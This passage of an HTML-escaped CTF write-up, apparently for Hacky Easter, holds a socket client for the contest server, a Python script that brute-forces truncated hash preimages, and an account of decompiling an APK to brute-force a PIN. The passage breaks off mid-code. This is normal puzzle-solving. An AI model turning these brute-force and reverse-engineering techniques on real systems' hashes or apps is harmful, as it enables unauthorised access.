            &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;challs&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;keys():&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;sendchall(s,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal)&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;challs[chal]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
                &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;::::::&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;


    &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Connection closed.&amp;quot;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;close()&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;nc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;netcat(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;hackyeaster.hacking-lab.com&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1400&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;challenge-24:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 24&lt;/h1&gt;

&lt;p&gt;Hrm, this really isn&amp;rsquo;t a secure hash at all. A Python script can do this&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;Crypto.Hash&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MD2,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MD5,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA256,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA512&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;itertools&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;os&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;


&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;part_1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;():&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gen:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(p)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MD2&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;new()&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;update(word)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;hexdigest()&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed[:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;target[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[*] First part is:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;part_2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;():&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gen:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(p)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MD5&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;new()&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;update(word)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;hexdigest()&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;target[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[*] Second part is:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;part_3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;():&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gen:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(p)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;new()&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;update(word)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;hexdigest()&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;target[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[*] Third part is:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;part_4&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;():&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gen:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(p)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA256&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;new()&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;update(word)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;hexdigest()&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;target[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[*] Fourth part is:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;part_5&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;():&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gen:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(p)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA512&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;new()&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;update(word)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;hexdigest()&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;target[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[*] Fifth part is:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;


&lt;span style=&#34;color: #f8f8f2&#34;&gt;my_chars&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;printable&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;target&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;757c47&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;9895d6&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;845b2b&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;0530cd&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;9a2b11&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;gen&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;itertools&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;combinations_with_replacement(my_chars,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[+] Here we go....&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;part_1()&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;part_2()&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;part_3()&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;part_4()&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;which_part&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;5&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;part_5()&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[+] Finished&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;challenge-25:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 25&lt;/h1&gt;

&lt;p&gt;Not solved.&lt;/p&gt;

&lt;h1 id=&#34;challenge-26:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 26&lt;/h1&gt;

&lt;p&gt;I saw no really easy way to do this other than taking apart the apk and
using &lt;code&gt;dex2jar&lt;/code&gt; on the main java file. In this file I found the code
that makes use of the PIN and reversed engineered the code. There&amp;rsquo;s
some hashing and ultimately the app will download the egg.&lt;/p&gt;

&lt;p&gt;So I reimplemented the Java code and bruteforced it. A few numbers matched,
so I just entered them until I got a valid download:
(disclaimer: I am not very good at Java at all)&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.io.File&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.io.FileOutputStream&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.security.MessageDigest&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.security.SecureRandom&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.util.regex.Matcher&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.util.regex.Pattern&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.security.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;//MessageDigest;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.crypto.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.crypto.spec.*&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;javax.crypto.spec.SecretKeySpec&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.awt.Graphics&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;java.util.Arrays&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
